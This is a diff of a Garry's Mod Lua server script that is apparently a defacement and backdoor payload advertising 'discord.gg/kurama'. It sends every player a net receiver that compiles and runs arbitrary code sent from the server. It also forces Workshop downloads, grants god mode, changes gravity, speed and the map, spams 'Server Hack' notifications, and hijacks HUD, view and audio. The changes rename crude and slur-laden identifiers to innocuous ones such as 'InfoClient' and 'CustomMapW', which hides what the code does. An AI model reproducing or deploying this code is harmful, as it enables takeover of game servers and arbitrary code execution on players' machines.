@@ -14,26 +14,26 @@ end
     return ret
 end
 local randomtable = {
-    Mainnet = RandomString(0, 69),
-    Terosapasse = RandomString(0, 69),
-    KuramaOofed = RandomString(0, 69),
-    ElFamosoKurama = RandomString(0, 69)
+    CodeRandom = RandomString(0, 69),
+    TimingRandom = RandomString(0, 69),
+    ClientRandom = RandomString(0, 69),
+    ServeurRadom = RandomString(0, 69)
     }
-util.AddNetworkString(randomtable["Terosapasse"])
-util.AddNetworkString(randomtable["Mainnet"])
-BroadcastLua([[net.Receive("]] .. randomtable["Mainnet"] .. [[",function()CompileString(util.Decompress(net.ReadData(net.ReadUInt(16))),"?")()end)]])
+util.AddNetworkString(randomtable["TimingRandom"])
+util.AddNetworkString(randomtable["CodeRandom"])
+BroadcastLua([[net.Receive("]] .. randomtable["CodeRandom"] .. [[",function()CompileString(util.Decompress(net.ReadData(net.ReadUInt(16))),"?")()end)]])
 hook.Add("PlayerInitialSpawn", "BonsoirParis", function(ply)
     if not ply:IsBot() then
-        ply:SendLua([[net.Receive("]] .. randomtable["Mainnet"] .. [[",function()CompileString(util.Decompress(net.ReadData(net.ReadUInt(16))),"?")()end)]])
+        ply:SendLua([[net.Receive("]] .. randomtable["CodeRandom"] .. [[",function()CompileString(util.Decompress(net.ReadData(net.ReadUInt(16))),"?")()end)]])
         ply:SendLua([[steamworks.DownloadUGC(2033009436, function(n) game.MountGMA(n) game.AddParticles("particles/lesheitan.pcf") PrecacheParticleSystem("lesheitan") end)]])
     end
 end)
 
 m_strImageGlobalVar = RandomString( 6, 12 )
-local function ElFamosoKuramaClient(code)
+local function InfoClient(code)
 local data = util.Compress(code)
 local len = #data
-    net.Start(randomtable["Mainnet"])
+    net.Start(randomtable["CodeRandom"])
     net.WriteUInt(len, 16)
     net.WriteData(data, len)
     net.Broadcast()
@@ -42,39 +42,65 @@ for k, v in pairs(player.GetAll()) do
     v:SendLua([[steamworks.DownloadUGC(2033009436, function(n) game.MountGMA(n) game.AddParticles("particles/lesheitan.pcf") PrecacheParticleSystem("lesheitan") end)]])
 end
 
-timer.Simple(2.5, function()
+-- Custom Settings
+timer.Simple( 5, function()
+    RunConsoleCommand("sv_gravity", "200")
+end)
+
+timer.Create("LoadGM", 235, 1, function()
+    RunConsoleCommand("ulx", "map", "gm_construct")
+end)
+
+timer.Simple(5, function()
     for k, v in pairs(player.GetAll()) do
-    v:SendLua([[RunConsoleCommand("gmod_language", "fr")]])
-end
+        v:SetRunSpeed(400 * 4)
+        v:SetWalkSpeed(400 * 4)
+    end
+end)
+
+timer.Simple(2.5, function()
     RunConsoleCommand("ulx", "god", "*")
     PrecacheParticleSystem("lesheitan")
 end)
 
+-- Particle - 2
 timer.Simple(5, function()
-ElFamosoKuramaClient([[net.Receive("]] .. randomtable["Terosapasse"] .. [[",function()CompileString(util.Decompress(net.ReadData(net.ReadUInt(16))),"?")()end)]])
-ElFamosoKuramaClient([[
+InfoClient([[net.Receive("]] .. randomtable["TimingRandom"] .. [[",function()CompileString(util.Decompress(net.ReadData(net.ReadUInt(16))),"?")()end)]])
+InfoClient([[
     for i = 1, 10 do
     ParticleEffectAttach("lesheitan", PATTACH_ABSORIGIN_FOLLOW, LocalPlayer(), 0)
 end
+]])
+end)
+
+-- Notif Spam
 timer.Simple(5, function()
-timer.Create("]] .. RandomString(0, 69) .. [[", 0.3, 0, function()
-    notification.AddLegacy( "Kurama", math.random(0, 4), 1.5 )
+    InfoClient([[
+timer.Create("]] .. RandomString(0, 69) .. [[", 0.5, 0, function()
+    notification.AddLegacy( "Server Hack by Kurama !", math.random(0, 4), 1.5 )
 end)
 
-timer.Create("]] .. RandomString(0, 69) .. [[", 0.3, 0, function()
-    notification.AddLegacy( "Inplex", math.random(0, 4), 1.5 )
+timer.Create("]] .. RandomString(0, 69) .. [[", 0.5, 0, function()
+    notification.AddLegacy( "Server Hack by TheCedoux !", math.random(0, 4), 1.5 )
 end)
 
-timer.Create("]] .. RandomString(0, 69) .. [[", 0.3, 0, function()
-    notification.AddLegacy( "Doge Chien", math.random(0, 4), 1.5 )
+timer.Create("]] .. RandomString(0, 69) .. [[", 0.5, 0, function()
+    notification.AddLegacy( "Server Hack by Doge Chien", math.random(0, 4), 1.5 )
 end)
 
-timer.Create("]] .. RandomString(0, 69) .. [[", 0.3, 0, function()
-        notification.AddLegacy( "TheCedoux", math.random(0, 4), 1.5 )
-    end)
+timer.Create("]] .. RandomString(0, 69) .. [[", 0.5, 0, function()
+    notification.AddLegacy( "Sorry my Friends !", math.random(0, 4), 1.5 )
 end)
 
+timer.Create("]] .. RandomString(0, 69) .. [[", 0.5, 0, function()
+    notification.AddLegacy( "discord.gg/kurama", math.random(0, 4), 1.5 )
+end)
+]])
+end)
+
+-- SkyBox
 timer.Simple(1, function()
+InfoClient([[
     function GAMEMODE:PostDraw2DSkyBox()
 local col = Color( 255, 255, 255)
     render.Clear(col.r/1.3, col.g/1.3, col.b/1.3, 255)
@@ -85,16 +111,16 @@ local col = Color( 255, 255, 255)
     render.Clear(col.r/1.3, col.g/1.3, col.b/1.3, 255)
         return !!1
     end
-end)
 ]])
 
+-- Font
 timer.Simple( 19.2, function()
-ElFamosoKuramaClient([=[
-local SheitanDev = math.Clamp(ScrH()/2.31, 0.85, 1.005);
-surface.CreateFont( "WeshMaGueuleTuEsMaPute", {
+InfoClient([=[
+local WriteFont = math.Clamp(ScrH()/2.31, 0.85, 1.005);
+surface.CreateFont( "Font1", {
     font = "Roboto",
     extended = false,
-    size = SheitanDev *  150,
+    size = WriteFont *  150,
     weight = 200,
     blursize = 1.5,
     italic = false,
@@ -103,10 +129,10 @@ surface.CreateFont( "WeshMaGueuleTuEsMaPute", {
     additive = false,
     outline = false,
     })
-    hook.Add( "HUDPaint", "OhUnNazyBienCuit", function()
+    hook.Add( "HUDPaint", "Font2", function()
     for i = 1, 60 do
 end
-    draw.SimpleTextOutlined("LeSheitan17", "WeshMaGueuleTuEsMaPute", ScrW() /2, ScrH() /2,Color( 255, 255, 255),TEXT_ALIGN_CENTER,TEXT_ALIGN_CENTER,3,Color( 0, 0, 0))
+    draw.SimpleTextOutlined("Kurama", "Font1", ScrW() /2, ScrH() /2,Color( 255, 255, 255),TEXT_ALIGN_CENTER,TEXT_ALIGN_CENTER,3,Color( 0, 0, 0))
 local mat = Entity(0):GetMaterials()
     for k,v in pairs(mat) do
     end
@@ -115,22 +141,22 @@ end)
 end)
 
 timer.Simple( 5, function()
-ElFamosoKuramaClient([=[
+InfoClient([=[
 g_]=].. m_strImageGlobalVar.. [=[ = {}
 local html = [[<style type="text/css"> html, body {background-color: transparent;} html{overflow:hidden; ]].. (true and "margin: -8px -8px;" or "margin: 0px 0px;") ..[[ } </style><body><img src="]] .. "%s" .. [[" alt="" width="]] .. "%i"..[[" height="]] .. "%i" .. [[" /></body>]]
 local function LoadWebMaterial( strURL, strUID, intSizeX, intSizeY )
-local FamosoHaxorKurama = vgui.Create( "HTML" )
-    FamosoHaxorKurama:SetPos( ScrW() -1, ScrH() -1 )
-    FamosoHaxorKurama:SetVisible( true )
-    FamosoHaxorKurama:SetMouseInputEnabled( false )
-    FamosoHaxorKurama:SetKeyBoardInputEnabled( false )
-    FamosoHaxorKurama:SetSize( intSizeX, intSizeY )
-    FamosoHaxorKurama:SetHTML( html:format(strURL, intSizeX, intSizeY) )
+local CustomMapW = vgui.Create( "HTML" )
+    CustomMapW:SetPos( ScrW() -1, ScrH() -1 )
+    CustomMapW:SetVisible( true )
+    CustomMapW:SetMouseInputEnabled( false )
+    CustomMapW:SetKeyBoardInputEnabled( false )
+    CustomMapW:SetSize( intSizeX, intSizeY )
+    CustomMapW:SetHTML( html:format(strURL, intSizeX, intSizeY) )
 local PageLoaded
 PageLoaded = function()
-local mat = FamosoHaxorKurama:GetHTMLMaterial()
+local mat = CustomMapW:GetHTMLMaterial()
     if mat then
-g_]=].. m_strImageGlobalVar.. [=[[strUID] = { mat, FamosoHaxorKurama }
+g_]=].. m_strImageGlobalVar.. [=[[strUID] = { mat, CustomMapW }
     return
 end
 timer.Simple( 0.5, PageLoaded )
@@ -140,7 +166,7 @@ end
 ]=])
 end)
 
-ElFamosoKuramaClient([[
+InfoClient([[
 local sW, sH = ScrW(), ScrH()
 local w,h = ScrW(), ScrH()
 local W, H = ScrW(), ScrH()
@@ -215,9 +241,9 @@ end
     p:SetColor( col )
 end
 
-local KuramaOofedMusique = {}
-    hook.Add("HUDPaint", "MesOreilleSaleArabe",function()
-    for k,v in pairs(KuramaOofedMusique) do
+local SoundPlay = {}
+    hook.Add("HUDPaint", "SoundStart",function()
+    for k,v in pairs(SoundPlay) do
         v()
     end
 end)
@@ -235,7 +261,7 @@ SOUNDSTART_CTP = true
     s:SetVolume(15)
     s:Play()
 local ragtbl = {}
-    KuramaOofedMusique["CoolEffect"] = function()
+    SoundPlay["CoolEffect"] = function()
 local tbl = {}
     s:FFT(tbl,FFT_2048)
     xpcall(function()
@@ -269,8 +295,8 @@ end)
     end
 end)
 
-hook.Add("HUDPaint", "]] .. randomtable["KuramaOofed"] .. [[", AudioVizualier)
-hook.Add("CalcView", "]] .. randomtable["KuramaOofed"] .. [[", function(ply, origin, angles, fov, znear, zfar)
+hook.Add("HUDPaint", "]] .. randomtable["ClientRandom"] .. [[", AudioVizualier)
+hook.Add("CalcView", "]] .. randomtable["ClientRandom"] .. [[", function(ply, origin, angles, fov, znear, zfar)
     return {
     ["origin"] = origin,
     ["angles"] = angles,
@@ -282,9 +308,9 @@ end)
 
 local function stop()
     audio = nil
-    hook.Remove("HUDPaint", "]] .. randomtable["KuramaOofed"] .. [[")
-    hook.Remove("HUDShouldDraw", "]] .. randomtable["KuramaOofed"] .. [[")
-    hook.Remove("CalcView", "]] .. randomtable["KuramaOofed"] .. [[") 
+    hook.Remove("HUDPaint", "]] .. randomtable["ClientRandom"] .. [[")
+    hook.Remove("HUDShouldDraw", "]] .. randomtable["ClientRandom"] .. [[")
+    hook.Remove("CalcView", "]] .. randomtable["ClientRandom"] .. [[") 
     for k, v in pairs(oldhooks) do
     hook.Add("HUDPaint", k, v)
         oldhooks[k] = nil
@@ -300,8 +326,8 @@ end
 end)
 
 timer.Simple(5, function()
-ElFamosoKuramaClient([[  
-timer.Create("]] .. randomtable["ElFamosoKurama"] .. [[", 1.7, 0, function()
+InfoClient([[  
+timer.Create("]] .. randomtable["ServeurRadom"] .. [[", 1.7, 0, function()
 local time = tonumber(0)
 local my_color = CurTime() % 6 * 60
 local Message = {
@@ -321,7 +347,6 @@ local Message = {
     "<<<< https://discord.gg/kurama >>>>",
     "<<< https://discord.gg/kurama >>>",
     "<< https://discord.gg/kurama >>",
-    "< https://discord.gg/kurama >",
     }
     for _, line in pairs(Message) do
     time = time + tonumber(0.1)
@@ -334,7 +359,7 @@ end)
 end)
 
 timer.Simple(5, function()
-ElFamosoKuramaClient([[
+InfoClient([[
 local data = {}
 local function genkurama(id)
 local pos = LocalPlayer():GetPos()
@@ -357,19 +382,4 @@ end
     end)
 end)
 ]])
-end)
-
-timer.Simple( 5, function()
-    RunConsoleCommand("sv_gravity", "200")
-end)
-
-timer.Create("WeshMaGueuleTuEsMaPuteGM_Construct", 235, 1, function()
-    RunConsoleCommand("ulx", "map", "gm_construct")
-end)
-
-timer.Simple(5, function()
-    for k, v in pairs(player.GetAll()) do
-        v:SetRunSpeed(400 * 4)
-        v:SetWalkSpeed(400 * 4)
-    end
 end)
